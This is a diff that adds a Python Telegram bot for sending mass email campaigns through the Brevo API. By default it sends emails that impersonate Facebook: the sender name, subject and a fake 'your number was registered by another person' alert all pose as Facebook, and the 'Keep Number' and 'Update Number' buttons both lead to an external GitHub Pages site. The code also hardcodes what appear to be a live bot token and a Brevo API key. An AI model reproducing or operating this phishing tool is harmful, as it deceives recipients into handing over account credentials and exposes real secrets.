@@ -1,0 +1,671 @@
+import os
+import re
+import json
+import time
+import html
+import asyncio
+import logging
+from pathlib import Path
+from typing import List, Dict, Any, Optional
+
+import requests
+from telegram import Update
+from telegram.constants import ParseMode
+from telegram.ext import (
+    ApplicationBuilder,
+    CommandHandler,
+    ContextTypes,
+)
+
+logging.basicConfig(
+    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
+    level=logging.INFO
+)
+
+BASE_DIR = Path(__file__).parent
+STATE_FILE = BASE_DIR / "state.json"
+LOG_FILE = BASE_DIR / "campaign_log.json"
+
+BOT_TOKEN = os.getenv("8726289510:AAFJwDCXD36K4rWZTKdpwCwHWftxks6-oPo", "").strip()
+BREVO_API_KEY = os.getenv("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", "").strip()
+SENDER_NAME = os.getenv("Facebook", "").strip()
+SENDER_EMAIL = os.getenv("customerservice@truckforsaleusa.com", "").strip()
+ADMIN_CHAT_ID = os.getenv("5811425897", "").strip()
+WEBSITE_LINK = os.getenv("https://Godplan10111.github.io/KING-COMPANY", "").strip()
+
+DEFAULT_SUBJECT = os.getenv("DEFAULT_SUBJECT", "Important update from Facebook").strip()
+BATCH_SIZE = int(os.getenv("BATCH_SIZE", "50"))
+BATCH_DELAY_SECONDS = int(os.getenv("BATCH_DELAY_SECONDS", "180"))
+DAILY_LIMIT = int(os.getenv("DAILY_LIMIT", "300"))
+MAX_FAILURES = int(os.getenv("MAX_FAILURES", "15"))
+
+EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$")
+
+DEFAULT_BODY = """Hi there,
+
+We wanted to let you know that your mobile number was verified and registered by another person on facebook.
+
+This mobile number is still associated with your account. If you're still receiving SMS notifications from facebook, the person who just confirmed may also see future facebook SMS notifications sent to this number.
+
+If you'd like to continue to keep this number on your account, click the Keep Number button.
+
+If you'd like to make changes to your mobile number, click the Update Number button.
+
+If you no longer use or do not have access to this phone number, please update your phone information or remove this number from your account.
+"""
+
+def default_state() -> Dict[str, Any]:
+    return {
+        "emails": [],
+        "subject": DEFAULT_SUBJECT,
+        "body": DEFAULT_BODY,
+        "button1_text": "Keep Number",
+        "button1_link": WEBSITE_LINK,
+        "button2_text": "Update Number",
+        "button2_link": WEBSITE_LINK,
+        "paused": False,
+        "sending": False,
+        "campaign_task_running": False,
+        "last_run": {
+            "sent": 0,
+            "failed": 0,
+            "skipped": 0,
+            "total": 0,
+            "last_error": ""
+        },
+        "daily_sent_count": 0,
+        "daily_sent_date": "",
+        "failed_emails": [],
+        "sent_emails": [],
+    }
+
+def load_state() -> Dict[str, Any]:
+    if STATE_FILE.exists():
+        try:
+            return json.loads(STATE_FILE.read_text(encoding="utf-8"))
+        except Exception:
+            logging.exception("Failed to load state file")
+    state = default_state()
+    save_state(state)
+    return state
+
+def save_state(state: Dict[str, Any]) -> None:
+    STATE_FILE.write_text(json.dumps(state, indent=2), encoding="utf-8")
+
+def append_log(entry: Dict[str, Any]) -> None:
+    logs = []
+    if LOG_FILE.exists():
+        try:
+            logs = json.loads(LOG_FILE.read_text(encoding="utf-8"))
+        except Exception:
+            logging.exception("Failed to load campaign log")
+    logs.append(entry)
+    LOG_FILE.write_text(json.dumps(logs, indent=2), encoding="utf-8")
+
+def is_admin(update: Update) -> bool:
+    if not update.effective_chat:
+        return False
+    if not ADMIN_CHAT_ID:
+        return True
+    return str(update.effective_chat.id) == str(ADMIN_CHAT_ID)
+
+def require_admin(func):
+    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not is_admin(update):
+            if update.effective_message:
+                await update.effective_message.reply_text("Unauthorized.")
+            return
+        return await func(update, context)
+    return wrapper
+
+def extract_emails(text: str) -> List[str]:
+    if not text:
+        return []
+    parts = re.split(r"[\s,;\n\r\t]+", text.strip())
+    emails = []
+    for part in parts:
+        email = part.strip().lower()
+        if email and EMAIL_REGEX.match(email):
+            emails.append(email)
+    return emails
+
+def dedupe_keep_order(items: List[str]) -> List[str]:
+    seen = set()
+    result = []
+    for item in items:
+        if item not in seen:
+            seen.add(item)
+            result.append(item)
+    return result
+
+def reset_daily_counter_if_needed(state: Dict[str, Any]) -> None:
+    today = time.strftime("%Y-%m-%d")
+    if state.get("daily_sent_date") != today:
+        state["daily_sent_date"] = today
+        state["daily_sent_count"] = 0
+
+def build_email_html(body: str, button1_text: str, button1_link: str, button2_text: str, button2_link: str) -> str:
+    escaped_body = html.escape(body).replace("\n", "<br>")
+    button1 = ""
+    button2 = ""
+
+    if button1_text and button1_link:
+        button1 = f"""
+        <tr>
+          <td align="center" style="padding-bottom: 14px;">
+            <a href="{html.escape(button1_link, quote=True)}"
+               style="display:inline-block;background:#2d7ff9;color:#ffffff;text-decoration:none;
+                      padding:16px 28px;border-radius:10px;font-size:18px;font-family:Arial,sans-serif;">
+              {html.escape(button1_text)}
+            </a>
+          </td>
+        </tr>
+        """
+
+    if button2_text and button2_link:
+        button2 = f"""
+        <tr>
+          <td align="center">
+            <a href="{html.escape(button2_link, quote=True)}"
+               style="display:inline-block;background:#222222;color:#ffffff;text-decoration:none;
+                      padding:16px 28px;border-radius:10px;font-size:18px;font-family:Arial,sans-serif;">
+              {html.escape(button2_text)}
+            </a>
+          </td>
+        </tr>
+        """
+
+    return f"""
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>My Company</title>
+</head>
+<body style="margin:0;padding:0;background:#f2f2f2;font-family:Arial,sans-serif;">
+  <table width="100%" cellpadding="0" cellspacing="0" border="0" style="background:#f2f2f2;padding:40px 0;">
+    <tr>
+      <td align="center">
+        <table width="600" cellpadding="0" cellspacing="0" border="0"
+               style="background:#ffffff;border-radius:12px;padding:40px;max-width:600px;">
+          <tr>
+            <td style="font-size:40px;font-weight:bold;color:#000000;padding-bottom:24px;">
+              Important account update
+            </td>
+          </tr>
+          <tr>
+            <td style="font-size:20px;color:#111111;padding-bottom:20px;">
+              Hello,
+            </td>
+          </tr>
+          <tr>
+            <td style="font-size:17px;line-height:1.7;color:#333333;padding-bottom:30px;">
+              {escaped_body}
+            </td>
+          </tr>
+          {button1}
+          {button2}
+          <tr>
+            <td style="font-size:13px;color:#666666;line-height:1.6;padding-top:30px;">
+              Sent by {html.escape(SENDER_NAME)} • {html.escape(SENDER_EMAIL)}
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+  </table>
+</body>
+</html>
+"""
+
+def send_brevo_email(to_email: str, subject: str, html_content: str) -> requests.Response:
+    url = "https://api.brevo.com/v3/smtp/email"
+    headers = {
+        "accept": "application/json",
+        "api-key": BREVO_API_KEY,
+        "content-type": "application/json"
+    }
+    payload = {
+        "sender": {
+            "name": SENDER_NAME,
+            "email": SENDER_EMAIL
+        },
+        "to": [{"email": to_email}],
+        "subject": subject,
+        "htmlContent": html_content
+    }
+    return requests.post(url, json=payload, headers=headers, timeout=30)
+
+@require_admin
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    chat_id = update.effective_chat.id if update.effective_chat else "unknown"
+    text = (
+        "Bot is ready.\n\n"
+        f"Your chat ID: `{chat_id}`\n\n"
+        "Commands:\n"
+        "/help\n"
+        "/addemails email1,email2 or paste many\n"
+        "/setsubject Your subject\n"
+        "/setmessage Your message\n"
+        "/setbutton1 Text | https://example.com\n"
+        "/setbutton2 Text | https://example.com\n"
+        "/preview\n"
+        "/testsend your@email.com\n"
+        "/sendcampaign\n"
+        "/pause\n"
+        "/resume\n"
+        "/status\n"
+        "/clearemails\n"
+    )
+    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
+
+@require_admin
+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await start(update, context)
+
+@require_admin
+async def addemails(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    text = update.message.text or ""
+    payload = text.replace("/addemails", "", 1).strip()
+    emails = extract_emails(payload)
+
+    if not emails:
+        await update.message.reply_text("No valid email addresses found.")
+        return
+
+    combined = dedupe_keep_order(state["emails"] + emails)
+    added_count = len(combined) - len(state["emails"])
+    state["emails"] = combined
+    save_state(state)
+
+    await update.message.reply_text(
+        f"Added {added_count} emails.\n"
+        f"Total stored: {len(state['emails'])}"
+    )
+
+@require_admin
+async def clearemails(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    state["emails"] = []
+    state["sent_emails"] = []
+    state["failed_emails"] = []
+    save_state(state)
+    await update.message.reply_text("Stored emails cleared.")
+
+@require_admin
+async def setsubject(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    payload = update.message.text.replace("/setsubject", "", 1).strip()
+    if not payload:
+        await update.message.reply_text("Usage:\n/setsubject Your subject here")
+        return
+    state["subject"] = payload
+    save_state(state)
+    await update.message.reply_text("Subject updated.")
+
+@require_admin
+async def setmessage(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    payload = update.message.text.replace("/setmessage", "", 1).strip()
+    if not payload:
+        await update.message.reply_text("Usage:\n/setmessage Your message here")
+        return
+    state["body"] = payload
+    save_state(state)
+    await update.message.reply_text("Message updated.")
+
+@require_admin
+async def setbutton1(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    payload = update.message.text.replace("/setbutton1", "", 1).strip()
+    if "|" not in payload:
+        await update.message.reply_text("Usage:\n/setbutton1 Button Text | https://example.com")
+        return
+    text_part, link_part = [x.strip() for x in payload.split("|", 1)]
+    state["button1_text"] = text_part
+    state["button1_link"] = link_part
+    save_state(state)
+    await update.message.reply_text("Button 1 updated.")
+
+@require_admin
+async def setbutton2(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    payload = update.message.text.replace("/setbutton2", "", 1).strip()
+    if "|" not in payload:
+        await update.message.reply_text("Usage:\n/setbutton2 Button Text | https://example.com")
+        return
+    text_part, link_part = [x.strip() for x in payload.split("|", 1)]
+    state["button2_text"] = text_part
+    state["button2_link"] = link_part
+    save_state(state)
+    await update.message.reply_text("Button 2 updated.")
+
+@require_admin
+async def preview(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    preview_text = (
+        f"*Subject:*\n{state['subject']}\n\n"
+        f"*Message:*\n{state['body']}\n\n"
+        f"*Button 1:*\n{state['button1_text']} -> {state['button1_link']}\n\n"
+        f"*Button 2:*\n{state['button2_text']} -> {state['button2_link']}\n\n"
+        f"*Stored emails:* {len(state['emails'])}"
+    )
+    await update.message.reply_text(preview_text, parse_mode=ParseMode.MARKDOWN)
+
+@require_admin
+async def testsend(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    payload = update.message.text.replace("/testsend", "", 1).strip()
+    emails = extract_emails(payload)
+
+    if not emails:
+        await update.message.reply_text("Usage:\n/testsend your@email.com")
+        return
+
+    test_email = emails[0]
+    html_content = build_email_html(
+        state["body"],
+        state["button1_text"],
+        state["button1_link"],
+        state["button2_text"],
+        state["button2_link"]
+    )
+
+    try:
+        resp = send_brevo_email(test_email, state["subject"], html_content)
+        if 200 <= resp.status_code < 300:
+            await update.message.reply_text(f"Test email sent to {test_email}")
+        else:
+            await update.message.reply_text(
+                f"Test send failed.\nStatus: {resp.status_code}\nResponse: {resp.text[:500]}"
+            )
+    except Exception as e:
+        await update.message.reply_text(f"Error during test send: {e}")
+
+async def campaign_runner(app, chat_id: int):
+    state = load_state()
+
+    if state.get("campaign_task_running"):
+        return
+
+    state["campaign_task_running"] = True
+    state["sending"] = True
+    state["paused"] = False
+    state["last_run"] = {
+        "sent": 0,
+        "failed": 0,
+        "skipped": 0,
+        "total": len(state["emails"]),
+        "last_error": ""
+    }
+    save_state(state)
+
+    reset_daily_counter_if_needed(state)
+    save_state(state)
+
+    html_content = build_email_html(
+        state["body"],
+        state["button1_text"],
+        state["button1_link"],
+        state["button2_text"],
+        state["button2_link"]
+    )
+
+    failure_count = 0
+    sent_this_run = 0
+    failed_emails = []
+    sent_emails = []
+
+    try:
+        email_pool = dedupe_keep_order(state["emails"])
+        unsent = [e for e in email_pool if e not in state.get("sent_emails", [])]
+
+        if not unsent:
+            state["sending"] = False
+            state["campaign_task_running"] = False
+            save_state(state)
+            await app.bot.send_message(chat_id=chat_id, text="No unsent emails left.")
+            return
+
+        await app.bot.send_message(
+            chat_id=chat_id,
+            text=f"Campaign started.\nTotal unsent: {len(unsent)}\nBatch size: {BATCH_SIZE}\nDelay: {BATCH_DELAY_SECONDS}s"
+        )
+
+        for i in range(0, len(unsent), BATCH_SIZE):
+            state = load_state()
+
+            if state.get("paused"):
+                state["sending"] = False
+                state["campaign_task_running"] = False
+                save_state(state)
+                await app.bot.send_message(chat_id=chat_id, text="Campaign paused.")
+                return
+
+            reset_daily_counter_if_needed(state)
+
+            if state["daily_sent_count"] >= DAILY_LIMIT:
+                state["sending"] = False
+                state["campaign_task_running"] = False
+                save_state(state)
+                await app.bot.send_message(
+                    chat_id=chat_id,
+                    text=f"Daily limit reached ({DAILY_LIMIT}). Resume tomorrow."
+                )
+                return
+
+            batch = unsent[i:i + BATCH_SIZE]
+            batch_sent = 0
+            batch_failed = 0
+
+            for email in batch:
+                state = load_state()
+                reset_daily_counter_if_needed(state)
+
+                if state["paused"]:
+                    state["sending"] = False
+                    state["campaign_task_running"] = False
+                    save_state(state)
+                    await app.bot.send_message(chat_id=chat_id, text="Campaign paused.")
+                    return
+
+                if state["daily_sent_count"] >= DAILY_LIMIT:
+                    state["sending"] = False
+                    state["campaign_task_running"] = False
+                    save_state(state)
+                    await app.bot.send_message(
+                        chat_id=chat_id,
+                        text=f"Daily limit reached ({DAILY_LIMIT}). Resume tomorrow."
+                    )
+                    return
+
+                try:
+                    resp = send_brevo_email(email, state["subject"], html_content)
+                    if 200 <= resp.status_code < 300:
+                        sent_this_run += 1
+                        batch_sent += 1
+                        state["daily_sent_count"] += 1
+                        state["sent_emails"] = dedupe_keep_order(state.get("sent_emails", []) + [email])
+                        save_state(state)
+                        sent_emails.append(email)
+                    else:
+                        batch_failed += 1
+                        failure_count += 1
+                        failed_emails.append({"email": email, "status": resp.status_code, "response": resp.text[:300]})
+                        state["failed_emails"] = state.get("failed_emails", []) + [email]
+                        state["last_run"]["last_error"] = f"{resp.status_code}: {resp.text[:200]}"
+                        save_state(state)
+
+                except Exception as e:
+                    batch_failed += 1
+                    failure_count += 1
+                    failed_emails.append({"email": email, "status": "exception", "response": str(e)})
+                    state["failed_emails"] = state.get("failed_emails", []) + [email]
+                    state["last_run"]["last_error"] = str(e)
+                    save_state(state)
+
+                if failure_count >= MAX_FAILURES:
+                    state["sending"] = False
+                    state["campaign_task_running"] = False
+                    state["last_run"]["sent"] = sent_this_run
+                    state["last_run"]["failed"] = failure_count
+                    save_state(state)
+                    await app.bot.send_message(
+                        chat_id=chat_id,
+                        text=f"Campaign stopped due to too many failures ({failure_count})."
+                    )
+                    append_log({
+                        "time": time.strftime("%Y-%m-%d %H:%M:%S"),
+                        "result": "stopped_too_many_failures",
+                        "sent": sent_this_run,
+                        "failed": failure_count,
+                        "failed_emails": failed_emails,
+                    })
+                    return
+
+            state = load_state()
+            state["last_run"]["sent"] = sent_this_run
+            state["last_run"]["failed"] = failure_count
+            save_state(state)
+
+            await app.bot.send_message(
+                chat_id=chat_id,
+                text=(
+                    f"Batch finished.\n"
+                    f"Batch sent: {batch_sent}\n"
+                    f"Batch failed: {batch_failed}\n"
+                    f"Total sent this run: {sent_this_run}\n"
+                    f"Total failures: {failure_count}"
+                )
+            )
+
+            if i + BATCH_SIZE < len(unsent):
+                await asyncio.sleep(BATCH_DELAY_SECONDS)
+
+        state = load_state()
+        state["sending"] = False
+        state["campaign_task_running"] = False
+        state["last_run"]["sent"] = sent_this_run
+        state["last_run"]["failed"] = failure_count
+        save_state(state)
+
+        append_log({
+            "time": time.strftime("%Y-%m-%d %H:%M:%S"),
+            "result": "completed",
+            "sent": sent_this_run,
+            "failed": failure_count,
+            "failed_emails": failed_emails,
+            "sent_emails_count": len(sent_emails),
+        })
+
+        await app.bot.send_message(
+            chat_id=chat_id,
+            text=f"Campaign completed.\nSent: {sent_this_run}\nFailed: {failure_count}"
+        )
+
+    except Exception as e:
+        state = load_state()
+        state["sending"] = False
+        state["campaign_task_running"] = False
+        state["last_run"]["last_error"] = str(e)
+        save_state(state)
+        await app.bot.send_message(chat_id=chat_id, text=f"Campaign crashed: {e}")
+
+@require_admin
+async def sendcampaign(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+
+    if not BREVO_API_KEY or not BOT_TOKEN or not SENDER_EMAIL:
+        await update.message.reply_text(
+            "Missing required environment variables. Set BOT_TOKEN, BREVO_API_KEY, and SENDER_EMAIL in Railway."
+        )
+        return
+
+    if state.get("campaign_task_running"):
+        await update.message.reply_text("Campaign already running.")
+        return
+
+    if not state["emails"]:
+        await update.message.reply_text("No emails stored. Use /addemails first.")
+        return
+
+    app = context.application
+    chat_id = update.effective_chat.id
+    asyncio.create_task(campaign_runner(app, chat_id))
+    await update.message.reply_text("Campaign task started.")
+
+@require_admin
+async def pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    state["paused"] = True
+    state["sending"] = False
+    save_state(state)
+    await update.message.reply_text("Pause requested.")
+
+@require_admin
+async def resume(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    if state.get("campaign_task_running"):
+        await update.message.reply_text("Campaign is already running.")
+        return
+
+    state["paused"] = False
+    save_state(state)
+    app = context.application
+    chat_id = update.effective_chat.id
+    asyncio.create_task(campaign_runner(app, chat_id))
+    await update.message.reply_text("Resume requested.")
+
+@require_admin
+async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    state = load_state()
+    text = (
+        f"Stored emails: {len(state['emails'])}\n"
+        f"Sending: {state.get('sending')}\n"
+        f"Paused: {state.get('paused')}\n"
+        f"Campaign running: {state.get('campaign_task_running')}\n"
+        f"Last run total: {state['last_run'].get('total', 0)}\n"
+        f"Last run sent: {state['last_run'].get('sent', 0)}\n"
+        f"Last run failed: {state['last_run'].get('failed', 0)}\n"
+        f"Daily sent count: {state.get('daily_sent_count', 0)}\n"
+        f"Last error: {state['last_run'].get('last_error', '') or 'None'}"
+    )
+    await update.message.reply_text(text)
+
+def validate_startup():
+    missing = []
+    if not BOT_TOKEN:
+        missing.append("BOT_TOKEN")
+    if not BREVO_API_KEY:
+        missing.append("BREVO_API_KEY")
+    if not SENDER_EMAIL:
+        missing.append("SENDER_EMAIL")
+
+    if missing:
+        raise RuntimeError(f"Missing environment variables: {', '.join(missing)}")
+
+def main():
+    validate_startup()
+
+    app = ApplicationBuilder().token(BOT_TOKEN).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("help", help_command))
+    app.add_handler(CommandHandler("addemails", addemails))
+    app.add_handler(CommandHandler("clearemails", clearemails))
+    app.add_handler(CommandHandler("setsubject", setsubject))
+    app.add_handler(CommandHandler("setmessage", setmessage))
+    app.add_handler(CommandHandler("setbutton1", setbutton1))
+    app.add_handler(CommandHandler("setbutton2", setbutton2))
+    app.add_handler(CommandHandler("preview", preview))
+    app.add_handler(CommandHandler("testsend", testsend))
+    app.add_handler(CommandHandler("sendcampaign", sendcampaign))
+    app.add_handler(CommandHandler("pause", pause))
+    app.add_handler(CommandHandler("resume", resume))
+    app.add_handler(CommandHandler("status", status))
+
+    app.run_polling(close_loop=False)
+
+if __name__ == "__main__":
+    main()
